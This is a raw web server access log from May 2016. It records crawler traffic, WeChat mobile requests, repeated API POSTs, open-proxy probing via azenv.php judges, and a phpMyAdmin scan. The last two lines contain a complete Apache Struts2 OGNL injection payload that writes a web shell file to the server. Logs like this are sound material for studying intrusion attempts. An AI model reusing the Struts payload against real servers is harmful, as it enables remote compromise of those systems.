140.207.54.77 - - [28/May/2016:11:37:02 +0800] "POST /api.php?hash=evYqw&signature=ff43e9dec1132816017f027325df0d41034a60ba&timestamp=1464406622&nonce=195027521 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
58.247.206.145 - - [28/May/2016:11:39:51 +0800] "POST /api.php?hash=evYqw&signature=891654b98222733b36ef6f97de4e9d1752726f81&timestamp=1464406790&nonce=1692457982 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
140.207.54.77 - - [28/May/2016:11:46:27 +0800] "POST /api.php?hash=evYqw&signature=103a75b82ebf8fc976b4a73305ff234a792be320&timestamp=1464407187&nonce=717405136 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
118.161.69.99 - - [28/May/2016:11:47:25 +0800] "CONNECT smtp.mail.yahoo.com:25 HTTP/1.0" 400 172 "-" "-"
140.207.54.77 - - [28/May/2016:11:50:09 +0800] "POST /api.php?hash=evYqw&signature=c73a596e7e037dc357756e7de8a1e6bba9e203e2&timestamp=1464407408&nonce=924089139 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
118.161.69.99 - - [28/May/2016:11:52:58 +0800] "CONNECT smtp.mail.yahoo.com:25 HTTP/1.0" 400 172 "-" "-"
118.161.69.99 - - [28/May/2016:11:57:41 +0800] "CONNECT smtp.mail.yahoo.com:25 HTTP/1.0" 400 172 "-" "-"
58.247.206.152 - - [28/May/2016:11:58:15 +0800] "POST /api.php?hash=r3bbG&signature=0a0ed4d0846deeb020bc847d6f55fad5a811fcd7&timestamp=1464407895&nonce=1336933963 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
58.247.206.142 - - [28/May/2016:11:58:35 +0800] "POST /api.php?hash=r3bbG&signature=c332a1e452df6c72731552090e2d96fa6e20956c&timestamp=1464407915&nonce=141435903 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
123.88.249.34 - - [28/May/2016:11:58:35 +0800] "GET /themes/mobile/default/form/appointment.php?weid=8 HTTP/1.1" 404 2163 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13E238 MicroMessenger/6.3.16 NetType/WIFI Language/zh_CN"
58.247.206.142 - - [28/May/2016:11:58:39 +0800] "POST /api.php?hash=r3bbG&signature=bdd8b608c6b7c3a4d35183378d8e7b74a3ecdc77&timestamp=1464407919&nonce=1786642407 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
123.88.249.34 - - [28/May/2016:11:58:39 +0800] "GET /themes/mobile/default/form/appointment.php?weid=8 HTTP/1.1" 404 2163 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13E238 MicroMessenger/6.3.16 NetType/WIFI Language/zh_CN"
58.247.206.147 - - [28/May/2016:11:58:42 +0800] "POST /api.php?hash=r3bbG&signature=71ae4e193d3d69c7a6b6c4db50cd677febeddaf6&timestamp=1464407922&nonce=1970534018 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
58.247.206.147 - - [28/May/2016:11:59:08 +0800] "POST /api.php?hash=r3bbG&signature=6eabec4f48e8536a2b40c5ff6e022887a2d0d33b&timestamp=1464407948&nonce=1552362585 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
123.88.249.34 - - [28/May/2016:11:59:18 +0800] "GET /mobile.php?act=module&cid=1000&weid=8&name=site&do=list2 HTTP/1.1" 404 2122 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13E238 MicroMessenger/6.3.16 NetType/WIFI Language/zh_CN"
58.247.206.142 - - [28/May/2016:11:59:18 +0800] "POST /api.php?hash=r3bbG&signature=5e862c7a6f948234ef5f79773ccd26c1c797e63d&timestamp=1464407958&nonce=866620678 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
107.151.226.242 - - [28/May/2016:11:59:31 +0800] "GET http://www.rx2.eu/ivy/azenv.php HTTP/1.0" 404 2053 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:11:59:38 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:12:01:02 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:12:01:04 +0800] "GET http://www.rx2.eu/ivy/azenv.php HTTP/1.0" 404 2053 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:12:02:05 +0800] "GET http://www.rx2.eu/ivy/azenv.php HTTP/1.0" 404 2053 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:12:02:05 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
58.247.206.153 - - [28/May/2016:12:12:08 +0800] "POST /api.php?hash=evYqw&signature=056019ed80ee850fa79bf362edf8a5ee02c02584&timestamp=1464408728&nonce=151906772 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
61.160.195.222 - - [28/May/2016:12:19:47 +0800] "GET http://119.90.40.16:8090/ HTTP/1.1" 404 2033 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2)"
140.207.54.77 - - [28/May/2016:12:35:38 +0800] "POST /api.php?hash=evYqw&signature=74973c8dfda27df2f5640161fdbb0504c21de051&timestamp=1464410138&nonce=656598934 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
140.207.54.77 - - [28/May/2016:12:36:01 +0800] "POST /api.php?hash=evYqw&signature=572f49e25e56fcef09164c3a7f946eef07f794fd&timestamp=1464410161&nonce=1140616174 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
107.151.226.242 - - [28/May/2016:12:38:13 +0800] "GET http://www.proxy-listen.de/azenv.php HTTP/1.0" 404 2050 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:12:38:18 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:12:39:48 +0800] "GET http://www.proxyjudge.info/azenv.php HTTP/1.0" 404 2050 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:12:39:48 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
58.247.206.142 - - [28/May/2016:12:41:37 +0800] "POST /api.php?hash=evYqw&signature=0aec78c4b9eed5950c94eb09d64d29f2c280ddd5&timestamp=1464410497&nonce=280037698 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
58.247.206.144 - - [28/May/2016:12:43:56 +0800] "POST /api.php?hash=evYqw&signature=13ad37cb36f2d8c78d3b414e0115ea40f44245be&timestamp=1464410636&nonce=2146126140 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
58.247.206.144 - - [28/May/2016:12:44:00 +0800] "POST /api.php?hash=evYqw&signature=d40ef3298413cd7c19058b0dfe3ba53eba908fe9&timestamp=1464410640&nonce=162950905 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
140.207.54.77 - - [28/May/2016:12:49:41 +0800] "POST /api.php?hash=evYqw&signature=c36e151c39a05909f9d078183adc61c5804e4884&timestamp=1464410981&nonce=1717758449 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
140.207.54.76 - - [28/May/2016:12:49:47 +0800] "POST /api.php?hash=evYqw&signature=07c93aea0d6391b7b55f9e51b3321b7da551e7f1&timestamp=1464410987&nonce=401548657 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
185.49.14.190 - - [28/May/2016:12:57:20 +0800] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 2074 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
140.207.54.77 - - [28/May/2016:13:13:49 +0800] "POST /api.php?hash=evYqw&signature=28d3ed4ef15ba9bcfe520bf7236c6e23f79d49e9&timestamp=1464412429&nonce=70749526 HTTP/1.0" 404 2150 "-" "Mozilla/4.0"
58.247.206.154 - - [28/May/2016:13:14:48 +0800] "POST /api.php?hash=evYqw&signature=75205c7be829b99a4ae639532ba21de5d3294a1a&timestamp=1464412488&nonce=1087083514 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
107.151.226.242 - - [28/May/2016:13:26:06 +0800] "GET http://proxyjudge.us/ HTTP/1.0" 404 2017 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:13:26:08 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
140.207.54.80 - - [28/May/2016:13:34:57 +0800] "POST /api.php?hash=evYqw&signature=3cb89753de09686426465b45a795bb79f32f4cee&timestamp=1464413697&nonce=773070939 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
107.151.226.242 - - [28/May/2016:14:04:56 +0800] "GET http://domkrim.com/av.php HTTP/1.0" 404 2033 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:14:04:57 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
140.207.54.77 - - [28/May/2016:14:05:25 +0800] "POST /api.php?hash=evYqw&signature=7a01f24c24531585dc4c8fb52233ab56ced681f9&timestamp=1464415525&nonce=181085430 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
58.247.206.154 - - [28/May/2016:14:07:05 +0800] "POST /api.php?hash=evYqw&signature=4bc203d609f3b9c15ddf6645860c09841e872f06&timestamp=1464415625&nonce=2049981023 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
5.178.86.74 - - [28/May/2016:14:07:50 +0800] "CONNECT check.best-proxies.ru:80 HTTP/1.1" 400 172 "-" "-"
59.42.210.198 - - [28/May/2016:14:07:58 +0800] "GET /member.php?act=login& HTTP/1.1" 404 2075 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER"
59.42.210.198 - - [28/May/2016:14:07:58 +0800] "GET /favicon.ico HTTP/1.1" 404 2063 "http://115.28.148.225/member.php?act=login&" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER"
119.147.146.189 - - [28/May/2016:14:07:58 +0800] "GET /member.php?act=login& HTTP/1.1" 404 2075 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95  Safari/537.36"
119.147.146.189 - - [28/May/2016:14:07:59 +0800] "GET /member.php?act=login& HTTP/1.1" 404 2075 "-" "Mozilla/5.0 (Linux; Android 4.4.4; MI 2 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Mobile Safari/537.36"
123.151.42.61 - - [28/May/2016:14:37:02 +0800] "GET http://www.baidu.com/ HTTP/1.1" 404 2029 "-" "-"
58.247.206.154 - - [28/May/2016:14:40:14 +0800] "POST /api.php?hash=evYqw&signature=243c9ad99b0453e6206b397f36fbe706e6471028&timestamp=1464417614&nonce=524418186 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
58.247.206.149 - - [28/May/2016:14:40:26 +0800] "POST /api.php?hash=evYqw&signature=2f58d9c4b40152c7263b37bc83e7020f4d0890b6&timestamp=1464417626&nonce=652743522 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
223.74.86.180 - - [28/May/2016:14:40:27 +0800] "GET /mobile.php?act=module&name=site&weid=12&do=content HTTP/1.1" 404 2112 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12D508 MicroMessenger/6.3.16 NetType/WIFI Language/zh_CN"
223.74.86.180 - - [28/May/2016:14:40:31 +0800] "GET /themes/mobile/default/form/phone.php?weid=12 HTTP/1.1" 404 2146 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12D508 MicroMessenger/6.3.16 NetType/WIFI Language/zh_CN"
58.247.206.139 - - [28/May/2016:14:40:32 +0800] "POST /api.php?hash=evYqw&signature=7208e477e9b13c2f38e00e813a3dd9b9cbb5078b&timestamp=1464417632&nonce=2012588027 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
107.151.226.242 - - [28/May/2016:14:46:38 +0800] "GET http://proxyjudge.us/ HTTP/1.0" 404 2017 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:14:46:42 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
80.82.78.38 - - [28/May/2016:14:47:12 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 2098 "-" "Mozilla"
107.151.226.242 - - [28/May/2016:14:47:45 +0800] "GET http://www.rx2.eu/ivy/azenv.php HTTP/1.0" 404 2053 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:14:47:46 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:14:49:44 +0800] "GET http://www.luisaranguren.com/azenv.php HTTP/1.0" 404 2052 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:14:49:46 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
113.17.183.171 - - [28/May/2016:14:51:53 +0800] "GET / HTTP/1.1" 404 2033 "-" "Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0"
106.185.47.161 - - [28/May/2016:15:15:33 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 2098 "-" "Mozilla"
219.135.61.26 - - [28/May/2016:15:19:41 +0800] "GET /favicon.ico HTTP/1.1" 404 2063 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0"
107.151.226.242 - - [28/May/2016:15:23:01 +0800] "GET http://www.advalleys.com/azenvaa.php HTTP/1.0" 404 2054 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:15:23:02 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:15:24:21 +0800] "GET http://domkrim.com/av.php HTTP/1.0" 404 2033 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:15:24:23 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
202.116.234.16 - - [28/May/2016:15:24:50 +0800] "HEAD / HTTP/1.0" 404 0 "-" "-"
58.247.206.149 - - [28/May/2016:15:44:35 +0800] "POST /api.php?hash=evYqw&signature=f2608085a653c94c47d6da50181e771b6cb4d684&timestamp=1464421475&nonce=918986298 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
58.247.206.150 - - [28/May/2016:15:44:41 +0800] "POST /api.php?hash=evYqw&signature=5293b0dd3b20f57826fa8d5339959e65d308b3da&timestamp=1464421481&nonce=2142654257 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
117.136.41.103 - - [28/May/2016:15:44:41 +0800] "GET /mobile.php?act=module&id=318&weid=12&name=site&do=detail HTTP/1.1" 404 2122 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15 MicroMessenger/6.3.16 NetType/3G+ Language/zh_HK"
58.247.206.154 - - [28/May/2016:15:44:46 +0800] "POST /api.php?hash=evYqw&signature=df436f1a8f9ed26e23a3ae4691c27b0790c16f83&timestamp=1464421486&nonce=769455730 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
106.185.47.161 - - [28/May/2016:15:50:20 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 2098 "-" "Mozilla"
107.151.226.242 - - [28/May/2016:15:53:29 +0800] "GET http://proxyjudge.us/ HTTP/1.0" 404 2017 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:15:53:30 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:15:54:33 +0800] "GET http://www.proxyjudge.info/azenv.php HTTP/1.0" 404 2050 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:15:54:37 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
140.207.54.77 - - [28/May/2016:16:06:43 +0800] "POST /api.php?hash=r3bbG&signature=37b0f28c998427ce9161e4058273c47fa67f6dd7&timestamp=1464422803&nonce=808464854 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
117.136.31.216 - - [28/May/2016:16:06:43 +0800] "GET /themes/mobile/default/form/appointment.php?weid=8 HTTP/1.1" 404 2163 "-" "Mozilla/5.0 (Linux; U; Android 4.3; zh-cn; Coolpad 8720L Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 MicroMessenger/6.1.0.57_r1024329.540 NetType/cmnet"
106.185.47.161 - - [28/May/2016:16:25:07 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 2098 "-" "Mozilla"
107.151.226.242 - - [28/May/2016:16:25:10 +0800] "GET http://www.proxyjudge.info/azenv.php HTTP/1.0" 404 2050 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:16:25:10 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
116.224.90.216 - - [28/May/2016:16:29:00 +0800] "GET /member.php?mod=logging&action=login&infloat=yes&handlekey=login&inajax=1&ajaxtarget=fwin_content_login HTTP/1.1" 404 2175 "http://bbs.renyihome.com/" "Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0"
116.224.90.216 - - [28/May/2016:16:29:00 +0800] "GET /member.php?mod=logging&action=login HTTP/1.1" 404 2092 "http://bbs.renyihome.com/" "Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0"
116.224.90.216 - - [28/May/2016:16:29:00 +0800] "GET /member.php?mod=logging&action=login HTTP/1.1" 404 2092 "http://bbs.renyihome.com/" "Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0"
116.224.90.216 - - [28/May/2016:16:29:00 +0800] "GET / HTTP/1.1" 404 2033 "http://bbs.renyihome.com/" "Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0"
169.229.3.91 - - [28/May/2016:16:29:30 +0800] "^\x08XM\xA1\xF7\xA7\xB2\x10\xB0\x9A\xBC\xA3\xDC\xDE\xF7\x1Fog\x0Bn0\xB7!\xD9\xB96\xC7\xAC~I\x01{3o\xFE\xC9p^\x07\xB7\xC1\xF78\xF5]\x18\xCA_\xBB\x83E\xE6\x09\x8D\x87\xE4\x5C\xB3\x1F\xAA\xB8\xD2\x13" 400 172 "-" "-"
58.247.206.143 - - [28/May/2016:16:53:41 +0800] "POST /api.php?hash=r3bbG&signature=dcdc53ef933eab3fdc657209a1b9da7c8c72ee03&timestamp=1464425621&nonce=1929394857 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
106.185.47.161 - - [28/May/2016:16:59:48 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 2098 "-" "Mozilla"
107.151.226.242 - - [28/May/2016:17:02:17 +0800] "GET http://www.rx2.eu/ivy/azenv.php HTTP/1.0" 404 2053 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:17:02:18 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
139.196.148.77 - - [28/May/2016:17:31:07 +0800] "GET /phpMyAdmin HTTP/1.1" 404 2060 "http://115.28.148.225/phpMyAdmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
106.185.47.161 - - [28/May/2016:17:34:33 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 2098 "-" "Mozilla"
107.151.226.242 - - [28/May/2016:17:49:47 +0800] "GET http://www.rx2.eu/ivy/azenv.php HTTP/1.0" 404 2053 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:17:49:49 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
61.236.129.148 - - [28/May/2016:18:06:23 +0800] "HEAD / HTTP/1.0" 404 0 "-" "-"
106.185.47.161 - - [28/May/2016:18:09:21 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 2098 "-" "Mozilla"
107.151.226.242 - - [28/May/2016:18:21:35 +0800] "GET http://www.luisaranguren.com/azenv.php HTTP/1.0" 404 2052 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:18:21:36 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
115.28.142.175 - - [28/May/2016:18:31:50 +0800] "CONNECT search.yahoo.com:443 HTTP/1.1" 400 172 "-" "-"
58.247.206.144 - - [28/May/2016:18:37:47 +0800] "POST /api.php?hash=r3bbG&signature=911c1c6462cbafedba6cac700dc288665f7f1c07&timestamp=1464431867&nonce=777392542 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
119.32.139.40 - - [28/May/2016:18:37:48 +0800] "GET /mobile.php?act=channel&name=home&weid=8 HTTP/1.1" 404 2097 "-" "Mozilla/5.0 (Linux; Android 4.3; SCH-I679 Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.2 TBS/036519 Safari/537.36 MicroMessenger/6.3.18.800 NetType/WIFI Language/zh_CN"
119.32.139.40 - - [28/May/2016:18:37:48 +0800] "GET /mobile.php?act=channel&name=home&weid=8 HTTP/1.1" 404 2097 "-" "Mozilla/5.0 (Linux; Android 4.3; SCH-I679 Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.2 TBS/036519 Safari/537.36 MicroMessenger/6.3.18.800 NetType/WIFI Language/zh_CN"
58.247.206.154 - - [28/May/2016:18:38:00 +0800] "POST /api.php?hash=r3bbG&signature=44381971b2044be2b11cbc694c72d690849aeed5&timestamp=1464431880&nonce=1751750348 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
119.32.139.40 - - [28/May/2016:18:38:00 +0800] "GET /mobile.php?act=channel&name=home&weid=8 HTTP/1.1" 404 2097 "-" "Mozilla/5.0 (Linux; Android 4.3; SCH-I679 Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.2 TBS/036519 Safari/537.36 MicroMessenger/6.3.18.800 NetType/WIFI Language/zh_CN"
119.32.139.40 - - [28/May/2016:18:38:01 +0800] "GET /mobile.php?act=channel&name=home&weid=8 HTTP/1.1" 404 2097 "-" "Mozilla/5.0 (Linux; Android 4.3; SCH-I679 Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.2 TBS/036519 Safari/537.36 MicroMessenger/6.3.18.800 NetType/WIFI Language/zh_CN"
119.32.139.40 - - [28/May/2016:18:38:04 +0800] "GET /mobile.php?act=channel&name=home&weid=8 HTTP/1.1" 404 2097 "http://115.28.148.225/mobile.php?act=channel&name=home&weid=8" "Mozilla/5.0 (Linux; Android 4.3; SCH-I679 Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.2 TBS/036519 Safari/537.36 MicroMessenger/6.3.18.800 NetType/WIFI Language/zh_CN"
5.178.86.78 - - [28/May/2016:18:43:04 +0800] "CONNECT check.best-proxies.ru:80 HTTP/1.1" 400 172 "-" "-"
106.185.47.161 - - [28/May/2016:18:44:40 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 2098 "-" "Mozilla"
80.82.78.38 - - [28/May/2016:18:52:16 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 2098 "-" "Mozilla"
106.185.47.161 - - [28/May/2016:19:19:22 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 2098 "-" "Mozilla"
106.38.241.153 - - [28/May/2016:19:32:59 +0800] "GET /forum.php?mod=viewthread&tid=2367 HTTP/1.1" 404 2088 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
106.38.241.153 - - [28/May/2016:19:33:00 +0800] "GET /robots.txt HTTP/1.1" 404 2063 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
106.38.241.153 - - [28/May/2016:19:33:09 +0800] "GET /forum.php?mod=viewthread&tid=2358 HTTP/1.1" 404 2088 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
40.77.167.66 - - [28/May/2016:19:53:49 +0800] "GET / HTTP/1.1" 404 2033 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
107.151.226.242 - - [28/May/2016:19:54:47 +0800] "GET http://www.proxy-listen.de/azenv.php HTTP/1.0" 404 2050 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:19:54:49 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:19:56:05 +0800] "GET http://www.proxy-listen.de/azenv.php HTTP/1.0" 404 2050 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:19:56:07 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:20:29:30 +0800] "GET http://www.proxyjudge.info/azenv.php HTTP/1.0" 404 2050 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:20:29:32 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
222.186.34.83 - - [28/May/2016:20:39:58 +0800] "GET ?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=lndex.jsp&shellContent=x&encoding=UTF-8&pp=%2f&info1=oko&info2=kok HTTP/1.1" 400 172 "-" "-"
222.186.34.83 - - [28/May/2016:20:39:58 +0800] "GET /loginAction.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=lndex.jsp&shellContent=x&encoding=UTF-8&pp=%2f&info1=oko&info2=kok HTTP/1.1" 404 2790 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1"
